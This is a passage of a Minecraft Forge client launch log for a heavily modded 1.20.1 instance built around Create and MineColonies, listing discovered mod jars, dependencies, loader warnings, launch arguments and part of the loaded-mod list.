[01:23:37] [main/INFO]: Found mod file tournament-1.20.1-forge-1.1.0_beta-5.3+af35b3821f.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file towntalk-1.20.1-1.0.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file trackwork-1.20.1-1.1.1b.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file trashcans-1.0.18b-forge-mc1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file travelersbackpack-forge-1.20.1-9.1.16.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file valkyrienskies-120-2.3.0-beta.5.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file waystones-forge-1.20-14.1.5.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file worldedit-mod-7.2.15.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file XaeroPlus-2.26.5+forge-1.20.1-WM1.39.4-MM25.2.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Xaeros_Minimap_25.2.0_Forge_1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file XaerosWorldMap_1.39.4_Forge_1.20.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/WARN]: Mod file E:\Curseforge\Install\libraries\net\minecraftforge\fmlcore\1.20.1-47.4.4\fmlcore-1.20.1-47.4.4.jar is missing mods.toml file
[01:23:37] [main/WARN]: Mod file E:\Curseforge\Install\libraries\net\minecraftforge\javafmllanguage\1.20.1-47.4.4\javafmllanguage-1.20.1-47.4.4.jar is missing mods.toml file
[01:23:37] [main/WARN]: Mod file E:\Curseforge\Install\libraries\net\minecraftforge\lowcodelanguage\1.20.1-47.4.4\lowcodelanguage-1.20.1-47.4.4.jar is missing mods.toml file
[01:23:37] [main/WARN]: Mod file E:\Curseforge\Install\libraries\net\minecraftforge\mclanguage\1.20.1-47.4.4\mclanguage-1.20.1-47.4.4.jar is missing mods.toml file
[01:23:37] [main/INFO]: Found mod file fmlcore-1.20.1-47.4.4.jar of type LIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file javafmllanguage-1.20.1-47.4.4.jar of type LANGPROVIDER with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file lowcodelanguage-1.20.1-47.4.4.jar of type LANGPROVIDER with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file mclanguage-1.20.1-47.4.4.jar of type LANGPROVIDER with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file client-1.20.1-20230612.114412-srg.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:37] [main/INFO]: Found mod file forge-1.20.1-47.4.4-universal.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.MinecraftLocator@ce9b9a9
[01:23:38] [main/WARN]: Attempted to select two dependency jars from JarJar which have the same identification: Mod File:  and Mod File: . Using Mod File: 
[01:23:38] [main/WARN]: Attempted to select a dependency jar for JarJar which was passed in as source: cloth_config. Using Mod File: E:\Curseforge\Instances\Create'a Colony (1)\mods\cloth-config-11.1.118-forge.jar
[01:23:38] [main/INFO]: Found 90 dependencies adding them to mods collection
[01:23:38] [main/INFO]: Found mod file fabric-transfer-api-v1-3.3.5+631c9cd677.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-dimensions-v1-2.1.54+8005d10d77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file kuma-api-forge-20.1.10+1.20.1.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-renderer-api-v1-3.2.1+cf68abbe77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file joml-primitives-1.10.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-module-parameter-names-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file kfflang-4.11.0.jar of type LANGPROVIDER with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-item-api-v1-2.1.28+4d0bbcfa77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-model-loading-api-v1-1.0.3+6274ab9d77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file zjsonpatch-0.4.11.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-rendering-fluids-v1-3.0.28+4ac5e37a77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file util-1.1.0+b19b27c4a4.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-screen-handler-api-v1-1.3.30+561530ec77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-annotations-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-models-v0-0.4.2+7c3892a477.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-module-kotlin-2.14.0-rubyfork.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-resource-loader-v0-0.11.10+bcd08ed377.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file mclib-20.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-rendering-v1-3.0.8+66e9a48f77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-renderer-indigo-1.5.2+b5b2da4177.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-convention-tags-v1-1.5.5+fa3d1c0177.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file ritchiesprojectilelib-2.0.0-dev+mc.1.20.1-forge-build.182.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-mining-level-api-v1-2.1.50+561530ec77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-command-api-v1-1.2.34+f71b366f77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file commons-collections4-4.3.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-block-view-api-v2-1.0.1+0767707077.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file MixinExtras-0.4.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-command-api-v2-2.2.13+561530ec77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file MixinSquared-0.1.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-data-attachment-api-v1-1.0.0+30ef839e77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file crackerslib-forge-1.20.1-0.4.4.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file mixinextras-forge-0.2.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jankson-1.2.3.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file create_dragon_lib-1.20.1-1.4.3.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jsonschema-module-jackson-4.25.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file itu-1.7.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-screen-api-v1-2.0.8+45a670a577.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-particles-v1-1.1.2+78e1ecb877.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file puzzlesaccessapi-forge-8.0.7.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file dagger-2.43.2.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file OldBiomes-1.0.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-content-registries-v0-4.0.11+a670df1e77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-transitive-access-wideners-v1-4.3.1+1880499877.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file caffeine-3.2.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-game-rule-api-v1-1.0.40+683d4da877.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file classmate-1.5.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-api-base-0.4.31+ef105b4977.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file runtime-1.0.0+1.20.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-api-lookup-api-v1-1.6.36+67f9824077.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-blockrenderlayer-v1-1.1.41+1d0da21e77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file json-schema-validator-1.0.71.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file mixinsquared-forge-0.1.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file LambdaEvents-2.4.2.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file Registrate-MC1.20-1.3.3.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-core-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-kotlin-dsl-1.2.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file api-1.1.0+b19b27c4a4.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-dataformat-cbor-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file spectrelib-forge-0.13.15+1.20.1.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-block-api-v1-1.0.11+0e6cb7f777.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file javax.inject-1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-resource-conditions-api-v1-2.3.8+9e342fc177.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file Reflect-1.3.2.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file kffmod-4.11.0.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file kfflib-4.11.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file bytecodecs-1.0.2.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file flywheel-forge-1.20.1-0.6.11-13.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-item-group-api-v1-4.0.12+c9161c2d77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jcpp-1.4.14.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file Connector-1.0.0-beta.46+1.20.1-fabricloader.jar of type LIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-biome-api-v1-13.0.13+dc36698e77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-entity-events-v1-1.6.0+4ca7515277.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-registry-sync-v0-2.3.3+1c0ea72177.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file yabn-1.0.3.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-recipe-api-v1-1.0.21+514a076577.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-loot-api-v2-1.2.1+eb28f93e77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-object-builder-api-v1-11.1.3+4bd998fa77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jackson-databind-2.14.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-rendering-data-attachment-v1-0.3.37+a6081afc77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-networking-api-v1-1.3.11+503a202477.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file jsonschema-generator-4.25.0.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-sound-api-v1-1.0.13+4f23bd8477.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-message-api-v1-5.1.9+52cc178c77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file tomlkt-jvm-0.3.7.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file commons-math3-3.6.1.jar of type GAMELIBRARY with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-lifecycle-events-v1-2.2.22+afab492177.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-data-generation-api-v1-12.3.4+369cb3a477.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-events-interaction-v0-0.6.2+0d0bd5a777.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-key-binding-api-v1-1.0.37+561530ec77.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:38] [main/INFO]: Found mod file fabric-client-tags-api-v1-1.1.2+5d6761b877.jar of type MOD with provider net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator@6d099323
[01:23:39] [main/INFO]: Fabric mod metadata not found in jar thedarkcolour.kotlinforforge, ignoring
[01:23:39] [main/INFO]: Dependency resolution found 1 candidates to load
[01:23:41] [main/INFO]: Found mod file replaymod-1.20.1-2.6.13_mapped_srg_1.20.1.jar of type MOD with provider org.sinytra.connector.locator.ConnectorLocator@77524ca7
[01:23:41] [main/INFO]: Successfully made module authlib transformable
[01:23:44] [main/INFO]: Compatibility level set to JAVA_17
[01:23:44] [main/INFO]: Successfully loaded Mixin Connector [com.sonicether.soundphysics.MixinConnector]
[01:23:44] [main/INFO]: Successfully loaded Mixin Connector [ca.spottedleaf.starlight.mixin.MixinConnector]
[01:23:44] [main/INFO]: Launching target 'forgeclient' with arguments [--version, forge-47.4.4, --gameDir, E:\Curseforge\Instances\Create'a Colony (1), --assetsDir, E:\Curseforge\Install\assets, --uuid, b3177828bf0c4d858c046932df2c7e0c, --username, AnimalLover6866, --assetIndex, 5, --accessToken, ????????, --clientId, YWY4MGRmMTgtN2IzYy00MzJlLWJhODctYjI3ZDI1NGE0YTY2, --xuid, 2533274960657592, --userType, msa, --versionType, release, --width, 1024, --height, 768]
[01:23:44] [main/WARN]: Reference map 'createdeco-forge-refmap.json' for createdeco.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:44] [main/INFO]: Loaded configuration file for ModernFix 5.14.0+mc1.20.1: 74 options available, 0 override(s) found
[01:23:44] [main/INFO]: Applying Nashorn fix
[01:23:44] [main/INFO]: Applied Forge config corruption patch
[01:23:44] [main/INFO]: Loaded configuration file for Embeddium: 260 options available, 3 override(s) found
[01:23:44] [main/INFO]: Searching for graphics cards...
[01:23:44] [main/INFO]: Found graphics card: GraphicsAdapterInfo[vendor=UNKNOWN, name=Parsec Virtual Display Adapter, version=DriverVersion=0.45.0.0]
[01:23:44] [main/INFO]: Found graphics card: GraphicsAdapterInfo[vendor=NVIDIA, name=NVIDIA GeForce RTX 2080 Ti, version=DriverVersion=32.0.15.7216]
[01:23:45] [main/WARN]: Embeddium has applied one or more workarounds to prevent crashes or other issues on your system: [NVIDIA_THREADED_OPTIMIZATIONS]
[01:23:45] [main/WARN]: This is not necessarily an issue, but it may result in certain features or optimizations being disabled. You can sometimes fix these issues by upgrading your graphics driver.
[01:23:45] [main/WARN]: Reference map 'CBCAT.refmap.json' for cbc_at.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/INFO]: Loading 216 mods:
	- ae2 15.2.8
	- ambientsounds 6.1.1
	- appleskin 2.5.1+mc1.20.1
	- architectury 9.2.14
	- athena 3.1.2
	- attributefix 21.0.4
	- balm 7.3.33
	- betterfpsdist 1.20.1-6.0
	- bettervillage 3.1.0
	- biomesoplenty 18.0.0.592
	- blockui 1.20.1-1.0.151-BETA
	- bobberdetector 0.1.9.1.20.1
	- bookshelf 20.1.9
	- byzantine 11h
	- capes 1.5.2+1.20
	- carryon 2.1.2.7
	- cbc_at 0.0.1-1.20.1-a
	- cbcmodernwarfare 0.0.6c+mc.1.20.1-forge
	- chipped 3.0.4
	- chunkloaders 1.2.8a
	- chunksending 1.20.1-2.8
	- citadel 2.5.4
	- cleanswing 1.20-1.5
	- cloth_config 11.1.118
	- clumps 12.0.0.4
	- cnbr_reworked 1.0.0
	- collective 7.40
	- comforts 6.3.5+1.20.1
	- connectivity 1.20.1-7.1
	- connectormod 1.0.0-beta.46+1.20.1
	- constructionwand 1.20.1-2.11
	- controlling 12.0.2
	- copycats 2.2.0+mc.1.20.1-forge
	- corn_delight 1.0.4-1.20.1
	- corpse 1.20.1-1.0.12
	- crackerslib 1.20.1-0.4.4
	- craftingtweaks 18.2.3
	- crafttweaker 14.0.38
	- create 0.5.1.j
	- create_central_kitchen 1.3.12
	- create_confectionery 1.1.0
	- create_connected 0.9.4-mc1.20.1
	- create_crush_everything 1.0.2
	- create_dragon_lib 1.4.3
	- create_enchantment_industry 1.2.9.d
	- create_eureka 1.0.0+forge-1.20.1
	- create_radar 0.1
	- create_recipes 1.0.0
	- create_sa 2.0.4.
	- create_the_air_wars 1.04
	- create_tweaked_controllers 1.20.1-1.2.4
	- createaddition 1.20.1-1.2.4e
	- createappliedkinetics 1.3.2-1.20.1
	- createbigcannons 5.8.2
	- createdeco 2.0.2-1.20.1-forge
	- createendertransmission 2.0.7-1.20.1
	- createliquidfuel 2.1.1-1.20.1
	- createloveandwar 0.1-1.20.1
	- createtweaker 4.0.9
	- creativecore 2.12.17
	- cupboard 1.20.1-2.6
	- curios 5.9.1+1.20.1
	- doapi 1.2.15
	- domum_ornamentum 1.20.1-1.0.184-BETA
	- drivebywire 0.0.10
	- effecttooltips 9.0.2
	- effortlessbuilding 3.7
	- embeddium 0.3.31+mc1.20.1
	- enchdesc 17.1.18
	- entityculling 1.7.0
	- fabric_api 0.92.2+1.11.12+1.20.1
	- fabric_api_base 0.4.31+ef105b4977
	- fabric_api_lookup_api_v1 1.6.36+67f9824077
	- fabric_biome_api_v1 13.0.13+dc36698e77
	- fabric_block_api_v1 1.0.11+0e6cb7f777
	- fabric_block_view_api_v2 1.0.1+0767707077
	- fabric_blockrenderlayer_v1 1.1.41+1d0da21e77
	- fabric_client_tags_api_v1 1.1.2+5d6761b877
	- fabric_command_api_v1 1.2.34+f71b366f77
	- fabric_command_api_v2 2.2.13+561530ec77
	- fabric_content_registries_v0 4.0.11+a670df1e77
	- fabric_convention_tags_v1 1.5.5+fa3d1c0177
	- fabric_data_attachment_api_v1 1.0.0+30ef839e77
	- fabric_data_generation_api_v1 12.3.4+369cb3a477
	- fabric_dimensions_v1 2.1.54+8005d10d77
	- fabric_entity_events_v1 1.6.0+4ca7515277
	- fabric_events_interaction_v0 0.6.2+0d0bd5a777
	- fabric_game_rule_api_v1 1.0.40+683d4da877
	- fabric_item_api_v1 2.1.28+4d0bbcfa77
	- fabric_item_group_api_v1 4.0.12+c9161c2d77
	- fabric_key_binding_api_v1 1.0.37+561530ec77
	- fabric_lifecycle_events_v1 2.2.22+afab492177
	- fabric_loot_api_v2 1.2.1+eb28f93e77
	- fabric_message_api_v1 5.1.9+52cc178c77
	- fabric_mining_level_api_v1 2.1.50+561530ec77
	- fabric_model_loading_api_v1 1.0.3+6274ab9d77
	- fabric_models_v0 0.4.2+7c3892a477
	- fabric_networking_api_v1 1.3.11+503a202477
	- fabric_object_builder_api_v1 11.1.3+4bd998fa77
	- fabric_particles_v1 1.1.2+78e1ecb877
	- fabric_recipe_api_v1 1.0.21+514a076577
	- fabric_registry_sync_v0 2.3.3+1c0ea72177
	- fabric_renderer_api_v1 3.2.1+cf68abbe77
	- fabric_renderer_indigo 1.5.2+b5b2da4177
	- fabric_rendering_data_attachment_v1 0.3.37+a6081afc77
	- fabric_rendering_fluids_v1 3.0.28+4ac5e37a77
	- fabric_rendering_v1 3.0.8+66e9a48f77
	- fabric_resource_conditions_api_v1 2.3.8+9e342fc177
	- fabric_resource_loader_v0 0.11.10+bcd08ed377
	- fabric_screen_api_v1 2.0.8+45a670a577
	- fabric_screen_handler_api_v1 1.3.30+561530ec77
	- fabric_sound_api_v1 1.0.13+4f23bd8477
	- fabric_transfer_api_v1 3.3.5+631c9cd677
	- fabric_transitive_access_wideners_v1 4.3.1+1880499877
	- fallingleaves 2.1.0
	- farmersdelight 1.20.1-1.2.4
	- ferritecore 6.0.1
	- flansmod 0.0NONE
	- flywheel 0.6.11-13
	- foodeffecttooltips 1.3.0
	- forge 47.4.4
	- framedblocks 9.3.1
	- framework 0.7.6
	- freecam 1.2.1+1.20
	- fusion 1.2.8+a
	- fzzy_config 0.5.1+1.20.1+forge
	- gamemenumodoption 2.2.1
	- geckolib 4.4.4
	- gpumemleakfix 1.20.1-1.8
	- immediatelyfast 1.2.10+1.20.4
	- immersive_paintings 0.6.7+1.20.1
	- inventorysorter 23.0.1
	- irisflw 1.20.1-0.2.2
	- jade 11.7.1
	- jadeaddons 5.2.2
	- jei 15.3.0.4
	- jeresources 1.4.0.247
	- justenoughprofessions 3.0.1
	- justzoom 1.0.2
	- kambrik 6.1.1+1.20.1
	- konkrete 1.8.0
	- kotlinforforge 4.11.0
	- kuma_api 20.1.10
	- letmedespawn 1.2.0
	- libraryferret 4.0.0
	- lightmanscurrency 1.20.1-2.2.5.4
	- mcjtylib 1.20-8.0.5
	- mcwbridges 3.0.0
	- mcwdoors 1.1.1
	- mcwfences 1.1.2
	- mcwtrpdoors 1.1.3
	- minecolonies 1.20.1-1.1.828-snapshot
	- minecraft 1.20.1
	- mixinextras 0.2.0
	- mixinsquared 0.1.1
	- modernfix 5.14.0+mc1.20.1
	- molten_metals 1.20.1-0.1.4
	- molten_vents 2.0.8
	- moonlight 1.20-2.12.6
	- mousetweaks 2.25.1
	- multipiston 1.20-1.2.43-RELEASE
	- mysterious_mountain_lib 1.4.5-1.20.1
	- naturescompass 1.20.1-1.11.2-forge
	- neruina 1.3.0
	- oculus 1.8.0
	- polymorph 0.49.2+1.20.1
	- puzzlesaccessapi 8.0.7
